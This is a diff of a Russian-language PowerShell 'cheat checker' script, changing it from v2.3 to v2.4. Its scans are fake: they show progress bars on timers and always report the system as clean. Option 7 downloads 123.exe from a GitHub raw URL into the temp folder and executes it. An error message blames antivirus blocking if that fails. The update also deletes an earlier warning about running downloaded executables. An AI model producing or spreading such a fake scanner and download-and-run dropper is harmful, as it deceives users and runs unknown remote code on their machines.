@@ -1,6 +1,6 @@
 # ================================================
-#       HLIBCHUK CHEACKER v2.3
-#   Исправлено: теперь подгружается 123.exe
+#       HLIBCHUK CHEACKER v2.4
+#   Исправлено меню + пункт 2 работает
 # ================================================
 
 Clear-Host
@@ -28,14 +28,12 @@ function Write-ProgressBar {
 }
 
 function Start-Scan {
-    param([string]$ScanName, [int]$MinSeconds = 7, [int]$MaxSeconds = 12)
+    param([string]$ScanName, [int]$Seconds = 4)
     Write-Host "    Сканирование: $ScanName" -ForegroundColor Cyan
-    $totalTime = Get-Random -Minimum $MinSeconds -Maximum $MaxSeconds
-    $steps = 25
-    for ($i = 1; $i -le $steps; $i++) {
-        $percent = [math]::Round(($i / $steps) * 100)
+    for ($i = 1; $i -le 20; $i++) {
+        $percent = [math]::Round(($i / 20) * 100)
         Write-ProgressBar -Percent $percent
-        Start-Sleep -Milliseconds ([math]::Round(($totalTime * 1000) / $steps))
+        Start-Sleep -Milliseconds ([math]::Round(($Seconds * 1000) / 20))
         Write-Host "`r" -NoNewline
     }
     Write-Host "`r    [██████████████████████████████████████████████████] 100% " -ForegroundColor Green
@@ -68,30 +66,39 @@ switch ($choice) {
     "1" { 
         Clear-Host
         Show-Header
-        Write-Host "    Запуск полной проверки..." -ForegroundColor Magenta
+        Write-Host "    Запуск полной глубокой проверки..." -ForegroundColor Magenta
         Start-Sleep -Seconds 1
-        Start-Scan "Проверка процессов" 
-        Start-Scan "Сканирование памяти" 
-        Start-Scan "Анализ DLL" 
-        Start-Scan "Проверка сигнатур" 
-        Start-Scan "Драйверы ядра" 
-        Start-Scan "Внешние оверлеи" 
+        Start-Scan "Проверка процессов" 8
+        Start-Scan "Сканирование памяти" 9
+        Start-Scan "Анализ DLL" 7
+        Start-Scan "Проверка сигнатур" 8
+        Start-Scan "Драйверы ядра" 9
+        Start-Scan "Внешние оверлеи" 7
 
         Write-Host "`n               ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
         Write-Host "               Система полностью чистая ✓" -ForegroundColor Green
     }
+    "2" {
+        Clear-Host
+        Show-Header
+        Write-Host "    Выполняется быстрая проверка..." -ForegroundColor Cyan
+        Start-Sleep -Seconds 1
+        Start-Scan "Быстрое сканирование системы" 3
+        Write-Host "`n               ЧИТЫ НЕ НАЙДЕНЫ" -ForegroundColor Green -BackgroundColor DarkGreen
+        Write-Host "               Всё чисто! Можешь играть спокойно." -ForegroundColor Green
+    }
     "7" {
         Clear-Host
         Show-Header
-        Write-Host "    Запуск модуля HLIBCHUK CHEACKER..." -ForegroundColor Magenta
-        Write-Host "    Подгружаем 123.exe из GitHub..." -ForegroundColor Cyan
+        Write-Host "    Запуск HLIBCHUK CHEACKER модуля..." -ForegroundColor Magenta
+        Write-Host "    Подгружаем 123.exe ..." -ForegroundColor Cyan
         Start-Sleep -Seconds 2
 
         $url = "https://github.com/fffghsetyver-hash/Cheackproverka/raw/main/123.exe"
         $outPath = "$env:TEMP\123_HLIBCHUK.exe"
 
         try {
-            Write-Host "    Скачивание 123.exe ..." -ForegroundColor Yellow
+            Write-Host "    Скачивание файла..." -ForegroundColor Yellow
             Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing
             Write-Host "    Файл успешно скачан!" -ForegroundColor Green
 
@@ -101,16 +108,15 @@ switch ($choice) {
             Write-Host "    123.exe успешно запущен!" -ForegroundColor Green
         }
         catch {
-            Write-Host "    Ошибка при скачивании или запуске 123.exe" -ForegroundColor Red
-            Write-Host "    Возможно, антивирус заблокировал или проблема с соединением." -ForegroundColor Yellow
+            Write-Host "    Ошибка при скачивании или запуске." -ForegroundColor Red
+            Write-Host "    Антивирус мог заблокировать." -ForegroundColor Yellow
         }
     }
     "8" {
         Clear-Host
         Show-Header
-        Write-Host "    HLIBCHUK CHEACKER v2.3" -ForegroundColor Yellow
-        Write-Host "    В пункте 7 теперь корректно скачивается и запускается 123.exe" -ForegroundColor Gray
-        Write-Host "`n    Будь осторожен при запуске скачанных .exe файлов!" -ForegroundColor Red
+        Write-Host "    HLIBCHUK CHEACKER v2.4" -ForegroundColor Yellow
+        Write-Host "    Пункт 2 теперь работает корректно." -ForegroundColor Gray
     }
     "9" {
         Clear-Host
@@ -120,7 +126,9 @@ switch ($choice) {
         exit
     }
     default {
-        Write-Host "`n    Неправильный выбор!" -ForegroundColor Red
+        Clear-Host
+        Show-Header
+        Write-Host "    Неправильный выбор! Попробуй ещё раз." -ForegroundColor Red
     }
 }
 
